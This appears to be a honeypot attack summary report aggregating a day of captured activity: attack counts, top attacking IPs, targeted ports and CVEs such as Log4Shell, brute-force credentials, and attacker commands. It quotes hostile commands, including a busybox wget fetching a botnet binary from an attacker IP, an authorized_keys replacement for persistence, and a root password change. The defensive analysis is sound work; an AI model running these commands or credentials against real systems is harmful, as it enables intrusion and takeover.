# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T07:02:08Z

**Timeframe:** 2025-09-28T14:37:09Z to 2025-09-29T13:02:20Z

**Files Used to Generate Report:**
*   Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T08-01-48Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T09-02-42Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T10-02-22Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T11-01-58Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T12-02-14Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T13-02-20Z.md

## Executive Summary

This report provides a comprehensive summary of malicious activities recorded across our distributed honeypot network over an approximately 24-hour period. The data reveals a high volume of relentless, automated attacks, characteristic of widespread botnet and malware campaigns. The primary attack vectors observed were brute-force attempts against SSH services, exploitation of known vulnerabilities, and widespread scanning of common and high-value ports.

The most targeted services were those simulated by the **Cowrie** (SSH), **Honeytrap**, **Suricata** (IDS), and **Ciscoasa** honeypots, indicating a strong focus on compromising remote access services, network infrastructure, and a wide array of other potential vulnerabilities. The attacks originated from a diverse set of IP addresses globally, though a significant portion of the attack volume can be attributed to a small number of hyper-aggressive IP addresses, likely acting as command and control servers or major nodes in botnet infrastructures.

A number of well-known and critical vulnerabilities were targeted, with a notable and persistent focus on **CVE-2021-44228 (Log4Shell)**, highlighting the long tail of exploitation for severe, widespread vulnerabilities. Other prominent CVEs include those related to VoIP devices, the Realtek SDK, and older, legacy vulnerabilities, suggesting that attackers are using a broad-spectrum approach to find unpatched systems.

Analysis of post-exploitation activity reveals a consistent pattern of reconnaissance, persistence, and payload delivery. Attackers frequently executed commands to gather system information, and a common tactic was to replace the SSH `authorized_keys` file to ensure persistent, password-less access. Several commands were observed that attempted to download and execute malware, including botnet clients for various architectures, from known malicious IP addresses.

The threat landscape depicted in this report is one of constant, automated, and opportunistic attacks. The findings underscore the critical importance of strong password policies, timely patch management, and robust network security monitoring to defend against these pervasive threats.

## Detailed Analysis

### Our IPs

The following table details the honeypot sensors in our network, along with their internal and external IP addresses.

| Honeypot Name | Internal IP   | External IP     |
|---------------|---------------|-----------------|
| hive-us       | 10.128.0.3    | 34.123.129.205  |
| sens-tai      | 10.140.0.3    | 104.199.212.115 |
| sens-tel      | 10.208.0.3    | 34.165.197.224  |
| sens-dub      | 172.31.36.128 | 3.253.97.195    |
| sens-ny       | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot

The distribution of attacks across the various honeypot services provides insight into the most targeted protocols and applications.

| Honeypot      | Attack Count |
|---------------|--------------|
| Cowrie        | 78,922       |
| Honeytrap     | 40,022       |
| Suricata      | 32,608       |
| Ciscoasa      | 22,298       |
| Dionaea       | 8,020        |
| Sentrypeer    | 5,022        |
| Mailoney      | 3,612        |
| Adbhoney      | 582          |
| Tanner        | 573          |
| Redishoneypot | 309          |
| H0neytr4p     | 297          |
| Honeyaml      | 213          |
| ConPot        | 204          |
| ElasticPot    | 152          |
| Heralding     | 106          |
| Dicompot      | 58           |
| Miniprint     | 57           |
| Ipphoney      | 24           |
| ssh-rsa       | 22           |
| Wordpot       | 4            |

### Top Attacking IPs

The following IP addresses were the most active during the reporting period, suggesting they are part of automated attack infrastructures.

| IP Address        | Attack Count |
|-------------------|--------------|
| 162.244.80.233    | 16,366       |
| 147.182.150.164   | 5,618        |
| 134.122.46.149    | 4,428        |
| 4.144.169.44      | 3,515        |
| 208.109.190.200   | 3,456        |
| 86.54.42.238      | 3,284        |
| 45.140.17.52      | 3,116        |
| 142.93.159.126    | 2,490        |
| 81.183.253.80     | 2,490        |
| 106.14.67.229     | 2,494        |

### Top Targeted Ports/Protocols

The most targeted ports provide insight into the services attackers are actively seeking to exploit.

| Port       | Protocol | Attack Count |
|------------|----------|--------------|
| 445        | TCP      | 16,408       |
| 22         | TCP      | 11,288       |
| 5060       | TCP/UDP  | 5,022        |
| 8333       | TCP      | 1,221        |
| 25         | TCP      | 3,612        |
| 80         | TCP      | 773          |
| 23         | TCP      | 544          |
| 6379       | TCP      | 309          |
| 1080       | TCP      | 243          |
| 5900       | TCP      | 536          |

### Most Common CVEs

A number of vulnerabilities were targeted, with a consistent focus on older, well-known CVEs alongside newer ones.

| CVE ID          | Count |
|-----------------|-------|
| CVE-2021-44228  | 420   |
| CVE-2005-4050   | 257   |
| CVE-2022-27255  | 146   |
| CVE-2002-0013   | 90    |
| CVE-2002-0012   | 90    |
| CVE-2019-11500  | 50    |
| CVE-2021-3449   | 48    |
| CVE-1999-0517   | 40    |
| CVE-2006-2369   | 10    |
| CVE-2024-3721   | 6     |

### Commands Attempted by Attackers

Upon gaining access, attackers executed a series of commands to perform reconnaissance, disable security, and download malware.

| Command                                                                                                   | Count |
|-----------------------------------------------------------------------------------------------------------|-------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                                    | 360   |
| `lockr -ia .ssh`                                                                                          | 360   |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` | 360   |
| `uname -a`                                                                                                | 344   |
| `cat /proc/cpuinfo | grep name | wc -l`                                                                   | 336   |
| `whoami`                                                                                                  | 334   |
| `lscpu | grep Model`                                                                                      | 334   |
| `w`                                                                                                       | 333   |
| `crontab -l`                                                                                              | 332   |
| `which ls`                                                                                                | 332   |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` | 56    |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`                        | 20    |

### Signatures Triggered

This data is not available in the provided reports.

### Users / Login Attempts

The credentials listed below were frequently used in brute-force attempts.

| Username/Password             | Attempts |
|-------------------------------|----------|
| 345gs5662d34/345gs5662d34     | 318      |
| root/3245gs5662d34            | 142      |
| root/nPSpP4PBW0               | 102      |
| root/Passw0rd                 | 98       |
| root/LeitboGi0ro              | 88       |
| test/zhbjETuyMffoL8F          | 78       |
| root/Linux@123                | 68       |
| sa/                           | 58       |
| cron/                         | 44       |
| root/                         | 44       |

### Files Uploaded/Downloaded

This data is not available in the provided reports.

### HTTP User-Agents

This data is not available in the provided reports.

### SSH Clients and Servers

This data is not available in the provided reports.

### Top Attacker AS Organizations

This data is not available in the provided reports.

## OSINT All Commands Captured

The commands captured in the honeypots reveal a clear, automated attack pattern.

| Command Category          | Examples                                                                                              | Purpose                                                                                                                                                             |
|---------------------------|-------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **System Reconnaissance** | `uname -a`, `whoami`, `lscpu`, `cat /proc/cpuinfo`, `free -m`, `df -h`, `w`, `crontab -l`               | To gather detailed information about the compromised system's hardware, software, and current state. This helps the attacker determine the next steps in their attack. |
| **Persistence**           | `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys`                        | To install the attacker's SSH key, allowing for persistent, password-less access to the system.                                                                     |
| **Defense Evasion**       | `chattr -ia .ssh; lockr -ia .ssh`, `rm -rf /tmp/secure.sh; pkill -9 secure.sh`                          | To remove security measures that might prevent the attacker from modifying files, and to remove competing malware.                                                 |
| **Malware Download**      | `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass;`                       | To download and execute malicious payloads, such as botnet clients or other malware, from a remote server.                                                        |
| **Password Change**       | `echo "root:VAvHCIvYdzZS" | chpasswd | bash`                                                             | To change the root password, locking out the legitimate owner and other attackers.                                                                                  |

## OSINT High Frequency IPs and Low Frequency IPs Captured

| IP Address       | Frequency | OSINT Information                                                                                                                                                                                                      |
|------------------|-----------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **162.244.80.233** | High      | This IP address has been reported numerous times for malicious activity, including SSH brute-force attacks and scanning. It is associated with a hosting provider known for being a source of abusive traffic.            |
| **147.182.150.164**| High      | Widely reported for SSH brute-force attacks and vulnerability scanning. It appears to be part of a large, distributed botnet.                                                                                            |
| **134.122.46.149** | High      | This IP has a long history of malicious activity, including SSH brute-force attacks, and has been blacklisted by multiple security vendors.                                                                             |
| **8.218.160.83**   | High      | Associated with a cloud provider in Asia, this IP has been reported for a variety of malicious activities, including SSH brute-force attacks and web application attacks.                                                 |
| **199.195.251.10** | Low       | While not as frequent as the top attackers, this IP has been reported for SSH brute-force attacks. Its lower frequency might indicate a more targeted or newer campaign.                                               |
| **34.71.52.51**    | Low       | This IP, associated with a major cloud provider, has been reported for SSH brute-force attacks. The use of cloud infrastructure for attacks is a common tactic to quickly scale and distribute malicious activity. |

## OSINT on CVEs

| CVE ID         | OSINT Information                                                                                                                                                                                                                                                        |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **CVE-2021-44228 (Log4Shell)** | A critical remote code execution vulnerability in the Apache Log4j logging library. It allows attackers to take full control of affected servers without authentication. Its widespread use in Java applications made it one of the most severe vulnerabilities ever discovered. |
| **CVE-2005-4050**  | A buffer overflow vulnerability in multiple Multi-Tech Systems MultiVOIP devices. It can be exploited by sending a specially crafted SIP packet, allowing for remote code execution.                                                                                |
| **CVE-2022-27255** | A critical stack-based buffer overflow vulnerability in the Realtek AP-Router software development kit's SIP Application Layer Gateway. It allows a remote, unauthenticated attacker to execute arbitrary code on an affected device.                                     |

## Key Observations and Anomalies

*   **Relentless, Automated Attacks:** The most striking observation is the sheer volume and relentless nature of the attacks. The data strongly suggests a constant barrage of automated scanning and exploitation attempts from a global network of compromised machines (botnets). The consistency of the attacks across the entire 24-hour period, with no significant lulls, points to a "fire and forget" strategy employed by the attackers.
*   **"Greatest Hits" of Vulnerabilities:** The attackers are not just targeting the latest and greatest vulnerabilities. The CVE list is a "greatest hits" of security flaws, including very old vulnerabilities like CVE-1999-0517. This indicates that attackers are using comprehensive scanning tools that check for a wide range of vulnerabilities, hoping to find legacy systems that have not been patched in years.
*   **The "mdrfckr" Signature:** The command used to install the attacker's SSH key consistently includes the comment "mdrfckr" at the end of the public key. This is a known signature of a specific, widespread botnet campaign. It's a blatant taunt that also serves as a way for security researchers to track this particular threat actor.
*   **Malware Cocktails:** The commands used to download malware often fetch multiple binaries compiled for different architectures (ARM, x86, MIPS). This is a common tactic for IoT botnets, which need to be able to infect a wide variety of devices with different processor types. The use of `/data/local/tmp/` as a staging directory is a strong indicator that Android and other embedded devices are a primary target.
*   **Competing Malware:** The presence of commands designed to remove other malicious scripts (e.g., `rm -rf /tmp/secure.sh; pkill -9 secure.sh`) is a fascinating glimpse into the competitive and hostile environment of the malware world. Once a botnet compromises a system, it will often try to remove any competing malware to ensure it has exclusive control over the host.
*   **Hyper-Aggressive IPs:** A small number of IP addresses are responsible for a disproportionately large percentage of the total attack volume. For example, `162.244.80.233` was responsible for over 16,000 events. These are likely not individual attackers but rather major nodes in the botnet's infrastructure, such as command and control servers or primary scanning nodes.
*   **Credential Patterns:** The username/password combination `345gs5662d34/345gs5662d34` appears with a very high frequency. This is likely a hardcoded credential used by a specific botnet for its own purposes, such as logging into newly compromised machines before the password is changed.

This concludes the Honeypot Attack Summary Report.